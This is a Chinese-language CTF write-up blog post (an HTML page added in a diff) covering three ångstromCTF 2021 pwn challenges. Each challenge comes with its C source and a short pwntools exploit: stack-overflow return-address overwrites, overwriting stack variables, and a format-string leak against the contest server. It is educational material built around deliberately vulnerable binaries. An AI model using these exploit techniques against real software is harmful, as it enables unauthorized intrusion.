@@ -1,0 +1,704 @@
+<!DOCTYPE html>
+<html lang="zh-CN">
+<head>
+
+    <!--[if lt IE 9]>
+        <style>body {display: none; background: none !important} </style>
+        <meta http-equiv="Refresh" Content="0; url=//outdatedbrowser.com/" />
+    <![endif]-->
+
+<meta charset="utf-8">
+<meta http-equiv="X-UA-Compatible" content="IE=edge, chrome=1" />
+<meta name="viewport" content="width=device-width, initial-scale=1, maximum-scale=1, user-scalable=no">
+<meta name="format-detection" content="telephone=no" />
+<meta name="author" content="lexsd6" />
+
+
+
+<meta name="description" content="记着自己去年刚接触国外的ctf比赛入门时,第一个接触的国外ctf比赛就是ångstromCTF。但当时我web方向做了很多，但今年却一道题都没有做出来（虽然其他方向做了写）。但也应该反省下《关于年过后我发现一年前的我比现在NB这件事》了。">
+<meta property="og:type" content="article">
+<meta property="og:title" content="ångstromCTF 2021--wp与复现记">
+<meta property="og:url" content="lexsd6.github.io/2021/04/08/actf--wp/index.html">
+<meta property="og:site_name" content="lexsd6&#39;s home">
+<meta property="og:description" content="记着自己去年刚接触国外的ctf比赛入门时,第一个接触的国外ctf比赛就是ångstromCTF。但当时我web方向做了很多，但今年却一道题都没有做出来（虽然其他方向做了写）。但也应该反省下《关于年过后我发现一年前的我比现在NB这件事》了。">
+<meta property="og:locale" content="zh_CN">
+<meta property="og:image" content="lexsd6.github.io/2021/04/08/actf--wp/image-20210411143557147.png">
+<meta property="og:image" content="lexsd6.github.io/2021/04/08/actf--wp/image-20210411143808124.png">
+<meta property="og:image" content="lexsd6.github.io/2021/04/08/actf--wp/image-20210411143857541.png">
+<meta property="og:image" content="lexsd6.github.io/2021/04/08/actf--wp/image-20210411153853754.png">
+<meta property="og:image" content="lexsd6.github.io/2021/04/08/actf--wp/image-20210411154011337.png">
+<meta property="og:image" content="lexsd6.github.io/2021/04/08/actf--wp/image-20210411160349101.png">
+<meta property="og:image" content="lexsd6.github.io/2021/04/08/actf--wp/image-20210412154952876.png">
+<meta property="article:published_time" content="2021-04-08T14:47:27.047Z">
+<meta property="article:modified_time" content="2021-04-12T08:30:34.175Z">
+<meta property="article:author" content="lexsd6">
+<meta property="article:tag" content="wp">
+<meta property="article:tag" content="web">
+<meta property="article:tag" content="pwn">
+<meta name="twitter:card" content="summary">
+<meta name="twitter:image" content="lexsd6.github.io/2021/04/08/actf--wp/image-20210411143557147.png">
+
+<link rel="apple-touch-icon" href= "/apple-touch-icon.png">
+
+
+    <link rel="alternate" href="/atom.xml" title="lexsd6&#39;s home" type="application/atom+xml">
+
+
+
+    <link rel="shortcut icon" href="/title.ico">
+
+
+
+    <link href="//cdn.bootcss.com/animate.css/3.5.1/animate.min.css" rel="stylesheet">
+
+
+
+    <link href="//cdn.bootcss.com/fancybox/2.1.5/jquery.fancybox.min.css" rel="stylesheet">
+
+
+
+    <script src="//cdn.bootcss.com/pace/1.0.2/pace.min.js"></script>
+    <link href="//cdn.bootcss.com/pace/1.0.2/themes/blue/pace-theme-minimal.css" rel="stylesheet">
+
+
+
+<link rel="stylesheet" href="/css/style.css">
+
+
+
+
+<link href="//cdn.bootcss.com/font-awesome/4.6.3/css/font-awesome.min.css" rel="stylesheet">
+
+
+<title>ångstromCTF 2021--wp与复现记 | lexsd6&#39;s home</title>
+
+<script src="//cdn.bootcss.com/jquery/2.2.4/jquery.min.js"></script>
+<script src="//cdn.bootcss.com/clipboard.js/1.5.10/clipboard.min.js"></script>
+
+<script>
+    var yiliaConfig = {
+        fancybox: true,
+        animate: true,
+        isHome: false,
+        isPost: true,
+        isArchive: false,
+        isTag: false,
+        isCategory: false,
+        fancybox_js: "//cdn.bootcss.com/fancybox/2.1.5/jquery.fancybox.min.js",
+        scrollreveal: "//cdn.bootcss.com/scrollReveal.js/3.1.4/scrollreveal.min.js",
+        search: true
+    }
+</script>
+
+
+    <script> yiliaConfig.jquery_ui = [false]; </script>
+
+
+
+    <script> yiliaConfig.rootUrl = "\/";</script>
+
+
+
+
+
+
+<meta name="generator" content="Hexo 4.2.0"></head>
+<body>
+  <div id="container">
+    <div class="left-col">
+    <div class="overlay"></div>
+<div class="intrude-less">
+    <header id="header" class="inner">
+        <a href="/" class="profilepic">
+            <img src="/img/lexsd6.png" class="animated zoomIn">
+        </a>
+        <hgroup>
+          <h1 class="header-author"><a href="/">lexsd6</a></h1>
+        </hgroup>
+
+        
+        <p class="header-subtitle"> Clumsy birds have to start flying early</p>
+        
+
+        
+            <form id="search-form">
+            <input type="text" id="local-search-input" name="q" placeholder="search..." class="search form-control" autocomplete="off" autocorrect="off" searchonload="false" />
+            <i class="fa fa-times" onclick="resetSearch()"></i>
+            </form>
+            <div id="local-search-result"></div>
+            <p class='no-result'>No results found <i class='fa fa-spinner fa-pulse'></i></p>
+        
+
+
+        
+            <div id="switch-btn" class="switch-btn">
+                <div class="icon">
+                    <div class="icon-ctn">
+                        <div class="icon-wrap icon-house" data-idx="0">
+                            <div class="birdhouse"></div>
+                            <div class="birdhouse_holes"></div>
+                        </div>
+                        <div class="icon-wrap icon-ribbon hide" data-idx="1">
+                            <div class="ribbon"></div>
+                        </div>
+                        
+                        <div class="icon-wrap icon-link hide" data-idx="2">
+                            <div class="loopback_l"></div>
+                            <div class="loopback_r"></div>
+                        </div>
+                        
+                        
+                        <div class="icon-wrap icon-me hide" data-idx="3">
+                            <div class="user"></div>
+                            <div class="shoulder"></div>
+                        </div>
+                        
+                    </div>
+                    
+                </div>
+                <div class="tips-box hide">
+                    <div class="tips-arrow"></div>
+                    <ul class="tips-inner">
+                        <li>菜单</li>
+                        <li>标签</li>
+                        
+                        <li>友情链接</li>
+                        
+                        
+                        <li>关于我</li>
+                        
+                    </ul>
+                </div>
+            </div>
+        
+
+        <div id="switch-area" class="switch-area">
+            <div class="switch-wrap">
+                <section class="switch-part switch-part1">
+                    <nav class="header-menu">
+                        <ul>
+                        
+                            <li><a href="/">主页</a></li>
+                        
+                            <li><a href="/archives/">所有文章</a></li>
+                        
+                            <li><a href="/tags/">标签云</a></li>
+                        
+                        </ul>
+                    </nav>
+                    <nav class="header-nav">
+                        <ul class="social">
+                            
+                                <a class="fa Email" href="mailto:lexsd6@foxmail.com" title="Email"></a>
+                            
+                                <a class="fa RSS" href="/atom.xml" title="RSS"></a>
+                            
+                                <a class="fa QQ" href="tencent://message/?uin=2927507170&Menu=yes" title="QQ"></a>
+                            
+                        </ul>
+                    </nav>
+                </section>
+                
+                
+                <section class="switch-part switch-part2">
+                    <div class="widget tagcloud" id="js-tagcloud">
+                        <ul class="tag-list" itemprop="keywords"><li class="tag-list-item"><a class="tag-list-link" href="/tags/Linux/" rel="tag">Linux</a></li><li class="tag-list-item"><a class="tag-list-link" href="/tags/crypto/" rel="tag">crypto</a></li><li class="tag-list-item"><a class="tag-list-link" href="/tags/ida/" rel="tag">ida</a></li><li class="tag-list-item"><a class="tag-list-link" href="/tags/libc/" rel="tag">libc</a></li><li class="tag-list-item"><a class="tag-list-link" href="/tags/mics/" rel="tag">mics</a></li><li class="tag-list-item"><a class="tag-list-link" href="/tags/mysql/" rel="tag">mysql</a></li><li class="tag-list-item"><a class="tag-list-link" href="/tags/node-js/" rel="tag">node-js</a></li><li class="tag-list-item"><a class="tag-list-link" href="/tags/php/" rel="tag">php</a></li><li class="tag-list-item"><a class="tag-list-link" href="/tags/problem-resolve/" rel="tag">problem-resolve</a></li><li class="tag-list-item"><a class="tag-list-link" href="/tags/problem-resolve/" rel="tag">problem_resolve</a></li><li class="tag-list-item"><a class="tag-list-link" href="/tags/pwn/" rel="tag">pwn</a></li><li class="tag-list-item"><a class="tag-list-link" href="/tags/python/" rel="tag">python</a></li><li class="tag-list-item"><a class="tag-list-link" href="/tags/sql/" rel="tag">sql</a></li><li class="tag-list-item"><a class="tag-list-link" href="/tags/translate/" rel="tag">translate</a></li><li class="tag-list-item"><a class="tag-list-link" href="/tags/web/" rel="tag">web</a></li><li class="tag-list-item"><a class="tag-list-link" href="/tags/wp/" rel="tag">wp</a></li></ul>
+                    </div>
+                </section>
+                
+                
+                
+                <section class="switch-part switch-part3">
+                    <div id="js-friends">
+                    
+                      <a class="main-nav-link switch-friends-link" href="https://hexo.io" target="_blank" rel="noopener">Hexo</a>
+                    
+                      <a class="main-nav-link switch-friends-link" href="https://pages.github.com/" target="_blank" rel="noopener">GitHub</a>
+                    
+                      <a class="main-nav-link switch-friends-link" href="http://moxfive.xyz/" target="_blank" rel="noopener">MOxFIVE</a>
+                    
+                    </div>
+                </section>
+                
+
+                
+                
+                <section class="switch-part switch-part4">
+                
+                    <div id="js-aboutme">一梦想成为五边形战士的老菜鸡</div>
+                </section>
+                
+            </div>
+        </div>
+    </header>                
+</div>
+    </div>
+    <div class="mid-col">
+      <nav id="mobile-nav">
+      <div class="overlay">
+          <div class="slider-trigger"></div>
+          <h1 class="header-author js-mobile-header hide"><a href="/" title="回到主页">lexsd6</a></h1>
+      </div>
+    <div class="intrude-less">
+        <header id="header" class="inner">
+            <a href="/" class="profilepic">
+                <img src="/img/lexsd6.png" class="animated zoomIn">
+            </a>
+            <hgroup>
+              <h1 class="header-author"><a href="/" title="回到主页">lexsd6</a></h1>
+            </hgroup>
+            
+            <p class="header-subtitle"> Clumsy birds have to start flying early</p>
+            
+            <nav class="header-menu">
+                <ul>
+                
+                    <li><a href="/">主页</a></li>
+                
+                    <li><a href="/archives/">所有文章</a></li>
+                
+                    <li><a href="/tags/">标签云</a></li>
+                
+                <div class="clearfix"></div>
+                </ul>
+            </nav>
+            <nav class="header-nav">
+                        <ul class="social">
+                            
+                                <a class="fa Email" target="_blank" href="mailto:lexsd6@foxmail.com" title="Email"></a>
+                            
+                                <a class="fa RSS" target="_blank" href="/atom.xml" title="RSS"></a>
+                            
+                                <a class="fa QQ" target="_blank" href="tencent://message/?uin=2927507170&Menu=yes" title="QQ"></a>
+                            
+                        </ul>
+            </nav>
+        </header>                
+    </div>
+    <link class="menu-list" tags="标签" friends="友情链接" about="关于我"/>
+</nav>
+      <div class="body-wrap"><article id="post-actf--wp" class="article article-type-post" itemscope itemprop="blogPost">
+  
+    <div class="article-meta">
+      <a href="/2021/04/08/actf--wp/" class="article-date">
+      <time datetime="2021-04-08T14:47:27.047Z" itemprop="datePublished">2021-04-08</time>
+</a>
+
+
+    </div>
+  
+  <div class="article-inner">
+    
+      <input type="hidden" class="isFancy" />
+    
+    
+      <header class="article-header">
+        
+  
+    <h1 class="article-title" itemprop="name">
+      ångstromCTF 2021--wp与复现记
+    </h1>
+  
+
+
+          <div style="margin-top:10px ;">
+    <span class="post-time">
+      <span class="post-meta-item-icon">
+        <i class="fa fa-keyboard-o"></i>
+        <span class="post-meta-item-text">  字数统计: </span>
+        <span class="post-count">2k字</span>
+      </span>
+    </span>
+    <span class="post-time">
+      &nbsp; | &nbsp;
+      <span class="post-meta-item-icon">
+        <i class="fa fa-hourglass-half"></i>
+        <span class="post-meta-item-text">阅读时长:</span>
+        <span class="post-count">10分</span>
+      </span>
+    </span>
+</div>
+                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                             
+          
+      </header>
+      
+      <div class="article-info article-info-post">
+        
+    <div class="article-category tagcloud">
+    <a class="article-category-link" href="/categories/CTF/">CTF</a>
+    </div>
+
+
+        
+    <div class="article-tag tagcloud" >
+        <ul class="article-tag-list" itemprop="keywords"><li class="article-tag-list-item"><a class="article-tag-list-link" href="/tags/pwn/" rel="tag">pwn</a></li><li class="article-tag-list-item"><a class="article-tag-list-link" href="/tags/web/" rel="tag">web</a></li><li class="article-tag-list-item"><a class="article-tag-list-link" href="/tags/wp/" rel="tag">wp</a></li></ul>
+
+    </div>
+                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                       
+        <div class="clearfix"></div>
+      </div>
+      
+    
+    <div class="article-entry" itemprop="articleBody">
+      
+          
+        <p>记着自己去年刚接触国外的ctf比赛入门时,第一个接触的国外ctf比赛就是ångstromCTF。但当时我web方向做了很多，但今年却一道题都没有做出来（虽然其他方向做了写）。但也应该反省下《关于年过后我发现一年前的我比现在NB这件事》了。<a id="more"></a></p>
+<h2 id="PWN"><a href="#PWN" class="headerlink" title="PWN"></a>PWN</h2><h3 id="tranquil"><a href="#tranquil" class="headerlink" title="tranquil"></a>tranquil</h3><p>题目友好给了源码（第一次做外国ctf pwn都这么友好M?）</p>
+<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;stdio.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;stdlib.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;string.h&gt;</span></span></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">win</span><span class="params">()</span></span>&#123;</span><br><span class="line">    <span class="keyword">char</span> flag[<span class="number">128</span>];</span><br><span class="line">    </span><br><span class="line">    FILE *file = fopen(<span class="string">"flag.txt"</span>,<span class="string">"r"</span>);</span><br><span class="line">    </span><br><span class="line">    <span class="keyword">if</span> (!file) &#123;</span><br><span class="line">        <span class="built_in">printf</span>(<span class="string">"Missing flag.txt. Contact an admin if you see this on remote."</span>);</span><br><span class="line">        <span class="built_in">exit</span>(<span class="number">1</span>);</span><br><span class="line">    &#125;</span><br><span class="line">    </span><br><span class="line">    fgets(flag, <span class="number">128</span>, file);</span><br><span class="line">    </span><br><span class="line">    <span class="built_in">puts</span>(flag);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">vuln</span><span class="params">()</span></span>&#123;</span><br><span class="line">    <span class="keyword">char</span> password[<span class="number">64</span>];</span><br><span class="line">    </span><br><span class="line">    <span class="built_in">puts</span>(<span class="string">"Enter the secret word: "</span>);</span><br><span class="line">    </span><br><span class="line">    gets(&amp;password);</span><br><span class="line">    </span><br><span class="line">    </span><br><span class="line">    <span class="keyword">if</span>(<span class="built_in">strcmp</span>(password, <span class="string">"password123"</span>) == <span class="number">0</span>)&#123;</span><br><span class="line">        <span class="built_in">puts</span>(<span class="string">"Logged in! The flag is somewhere else though..."</span>);</span><br><span class="line">    &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">        <span class="built_in">puts</span>(<span class="string">"Login failed!"</span>);</span><br><span class="line">    &#125;</span><br><span class="line">    </span><br><span class="line">    <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">main</span><span class="params">()</span></span>&#123;</span><br><span class="line">    setbuf(<span class="built_in">stdout</span>, <span class="literal">NULL</span>);</span><br><span class="line">    setbuf(<span class="built_in">stderr</span>, <span class="literal">NULL</span>);</span><br><span class="line"></span><br><span class="line">    vuln();</span><br><span class="line">    </span><br><span class="line">    <span class="comment">// not so easy for you!</span></span><br><span class="line">    <span class="comment">// win();</span></span><br><span class="line">    </span><br><span class="line">    <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
+
+<p>经过审计发现题目给了后面函数win()，我们只要bypass <code>strcmp</code>函数即可利用栈溢出来调用win()</p>
+<p>由于<code>strcmp</code>函数只判断到<code>\x00</code>截止，我们可以利用<code>password123%00</code>来bypass。</p>
+<p>exp：</p>
+<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line"></span><br><span class="line">e=ELF(<span class="string">'./tranquil'</span>)</span><br><span class="line">p=remote(<span class="string">'shell.actf.co'</span>,<span class="number">21830</span>)</span><br><span class="line"><span class="comment">#process('./tranquil')</span></span><br><span class="line"></span><br><span class="line">pay=<span class="string">'password123'</span>+(<span class="number">0x40</span>-len(<span class="string">'password123'</span>))*<span class="string">'a'</span>+p64(<span class="number">0</span>)+p64(e.symbols[<span class="string">'win'</span>])</span><br><span class="line"></span><br><span class="line">p.sendline(pay)</span><br><span class="line">p.interactive()</span><br></pre></td></tr></table></figure>
+
+
+
+<h3 id="Sanity-Checks"><a href="#Sanity-Checks" class="headerlink" title="Sanity Checks"></a>Sanity Checks</h3><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;stdio.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;stdlib.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;string.h&gt;</span></span></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">void</span> <span class="title">main</span><span class="params">()</span></span>&#123;</span><br><span class="line">    setbuf(<span class="built_in">stdout</span>, <span class="literal">NULL</span>);</span><br><span class="line">    setbuf(<span class="built_in">stderr</span>, <span class="literal">NULL</span>);</span><br><span class="line"></span><br><span class="line">    <span class="keyword">char</span> password[<span class="number">64</span>];</span><br><span class="line">    <span class="keyword">int</span> ways_to_leave_your_lover = <span class="number">0</span>;</span><br><span class="line">    <span class="keyword">int</span> what_i_cant_drive = <span class="number">0</span>;</span><br><span class="line">    <span class="keyword">int</span> when_im_walking_out_on_center_circle = <span class="number">0</span>;</span><br><span class="line">    <span class="keyword">int</span> which_highway_to_take_my_telephones_to = <span class="number">0</span>;</span><br><span class="line">    <span class="keyword">int</span> when_i_learned_the_truth = <span class="number">0</span>;</span><br><span class="line">    </span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">"Enter the secret word: "</span>);</span><br><span class="line">    </span><br><span class="line">    gets(&amp;password);</span><br><span class="line">    </span><br><span class="line">    <span class="keyword">if</span>(<span class="built_in">strcmp</span>(password, <span class="string">"password123"</span>) == <span class="number">0</span>)&#123;</span><br><span class="line">        <span class="built_in">puts</span>(<span class="string">"Logged in! Let's just do some quick checks to make sure everything's in order..."</span>);</span><br><span class="line">        <span class="keyword">if</span> (ways_to_leave_your_lover == <span class="number">50</span>) &#123;</span><br><span class="line">            <span class="keyword">if</span> (what_i_cant_drive == <span class="number">55</span>) &#123;</span><br><span class="line">                <span class="keyword">if</span> (when_im_walking_out_on_center_circle == <span class="number">245</span>) &#123;</span><br><span class="line">                    <span class="keyword">if</span> (which_highway_to_take_my_telephones_to == <span class="number">61</span>) &#123;</span><br><span class="line">                        <span class="keyword">if</span> (when_i_learned_the_truth == <span class="number">17</span>) &#123;</span><br><span class="line">                            <span class="keyword">char</span> flag[<span class="number">128</span>];</span><br><span class="line">                            </span><br><span class="line">                            FILE *f = fopen(<span class="string">"flag.txt"</span>,<span class="string">"r"</span>);</span><br><span class="line">                            </span><br><span class="line">                            <span class="keyword">if</span> (!f) &#123;</span><br><span class="line">                                <span class="built_in">printf</span>(<span class="string">"Missing flag.txt. Contact an admin if you see this on remote."</span>);</span><br><span class="line">                                <span class="built_in">exit</span>(<span class="number">1</span>);</span><br><span class="line">                            &#125;</span><br><span class="line">                            </span><br><span class="line">                            fgets(flag, <span class="number">128</span>, f);</span><br><span class="line">                            </span><br><span class="line">                            <span class="built_in">printf</span>(flag);</span><br><span class="line">                            <span class="keyword">return</span>;</span><br><span class="line">                        &#125;</span><br><span class="line">                    &#125;</span><br><span class="line">                &#125;</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="built_in">puts</span>(<span class="string">"Nope, something seems off."</span>);</span><br><span class="line">    &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">        <span class="built_in">puts</span>(<span class="string">"Login failed!"</span>);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
+
+<p>在上一题的基层上，增加了对4个变量的判断，打开ida发现要判断的4个变量在栈末位，每个占有2个字节于是合理推算栈空间。</p>
+<p>exp：</p>
+<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line"></span><br><span class="line">p=remote(<span class="string">'shell.actf.co'</span>,<span class="number">21303</span>)</span><br><span class="line"><span class="comment">#process('./checks')</span></span><br><span class="line">e=ELF(<span class="string">'./checks'</span>)</span><br><span class="line">pay=<span class="string">'password123\00'</span>+(<span class="number">0x60</span>-len(<span class="string">'password123\00'</span>)<span class="number">-0x14</span>)*<span class="string">'a'</span>+p32(<span class="number">0x11</span>)+p32(<span class="number">0x3d</span>)+p32(<span class="number">0xf5</span>)+p32(<span class="number">0x37</span>)+p32(<span class="number">0x32</span>)</span><br><span class="line"><span class="keyword">print</span> len(p32(<span class="number">0x11</span>)+p32(<span class="number">0x3d</span>)+p32(<span class="number">0xf5</span>)+p32(<span class="number">0x37</span>)+p32(<span class="number">0x32</span>))</span><br><span class="line"><span class="comment">#gdb.attach(p)</span></span><br><span class="line">p.sendline(pay)</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">p.interactive()</span><br></pre></td></tr></table></figure>
+
+
+
+<h3 id="stickystacks"><a href="#stickystacks" class="headerlink" title="stickystacks"></a>stickystacks</h3><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;stdio.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;stdlib.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;string.h&gt;</span></span></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="keyword">typedef</span> <span class="class"><span class="keyword">struct</span> <span class="title">Secrets</span> &#123;</span></span><br><span class="line">    <span class="keyword">char</span> secret1[<span class="number">50</span>];</span><br><span class="line">    <span class="keyword">char</span> password[<span class="number">50</span>];</span><br><span class="line">    <span class="keyword">char</span> birthday[<span class="number">50</span>];</span><br><span class="line">    <span class="keyword">char</span> ssn[<span class="number">50</span>];</span><br><span class="line">    <span class="keyword">char</span> flag[<span class="number">128</span>];</span><br><span class="line">&#125; Secrets;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">vuln</span><span class="params">()</span></span>&#123;</span><br><span class="line">    <span class="keyword">char</span> name[<span class="number">7</span>];</span><br><span class="line">    </span><br><span class="line">    Secrets boshsecrets = &#123;</span><br><span class="line">        .secret1 = <span class="string">"CTFs are fun!"</span>,</span><br><span class="line">        .password= <span class="string">"password123"</span>,</span><br><span class="line">        .birthday = <span class="string">"1/1/1970"</span>,</span><br><span class="line">        .ssn = <span class="string">"123-456-7890"</span>,</span><br><span class="line">    &#125;;</span><br><span class="line">    </span><br><span class="line">    </span><br><span class="line">    FILE *f = fopen(<span class="string">"flag.txt"</span>,<span class="string">"r"</span>);</span><br><span class="line">    <span class="keyword">if</span> (!f) &#123;</span><br><span class="line">        <span class="built_in">printf</span>(<span class="string">"Missing flag.txt. Contact an admin if you see this on remote."</span>);</span><br><span class="line">        <span class="built_in">exit</span>(<span class="number">1</span>);</span><br><span class="line">    &#125;</span><br><span class="line">    fgets(&amp;(boshsecrets.flag), <span class="number">128</span>, f);</span><br><span class="line">    </span><br><span class="line">    </span><br><span class="line">    <span class="built_in">puts</span>(<span class="string">"Name: "</span>);</span><br><span class="line">    </span><br><span class="line">    fgets(name, <span class="number">6</span>, <span class="built_in">stdin</span>);</span><br><span class="line">    </span><br><span class="line">    </span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">"Welcome, "</span>);</span><br><span class="line">    <span class="built_in">printf</span>(name);</span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">"\n"</span>);</span><br><span class="line">    </span><br><span class="line">    <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">main</span><span class="params">()</span></span>&#123;</span><br><span class="line">    setbuf(<span class="built_in">stdout</span>, <span class="literal">NULL</span>);</span><br><span class="line">    setbuf(<span class="built_in">stderr</span>, <span class="literal">NULL</span>);</span><br><span class="line"></span><br><span class="line">    vuln();</span><br><span class="line">    </span><br><span class="line">    <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
+
+<p>观察代码发现<code>printf(name);</code>有格式化字符串漏洞。利用次来找flag。</p>
+<p>exp：</p>
+<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line"></span><br><span class="line"><span class="comment">#e=ELF('stickystacks')</span></span><br><span class="line">p=remote(<span class="string">'shell.actf.co'</span>,<span class="number">21820</span>)</span><br><span class="line"><span class="comment">#process('stickystacks')</span></span><br><span class="line"><span class="comment">#gdb.attach(p)</span></span><br><span class="line">p.sendline(<span class="string">'%42$p'</span>)</span><br><span class="line">p.interactive()</span><br></pre></td></tr></table></figure>
+
+
+
